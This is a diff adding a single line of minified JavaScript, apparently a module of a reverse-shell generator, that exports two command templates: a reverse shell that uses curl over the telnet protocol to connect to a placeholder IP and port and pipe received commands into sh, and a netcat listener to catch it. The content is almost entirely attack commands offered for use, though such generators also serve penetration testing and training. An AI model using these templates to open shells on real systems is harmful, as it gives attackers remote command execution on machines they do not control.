@@ -1,0 +1,1 @@
+const e=[{title:"Curl reverse shell",template:"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",description:"Reverse shell using curl over the telnet protocol to execute commands remotely."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
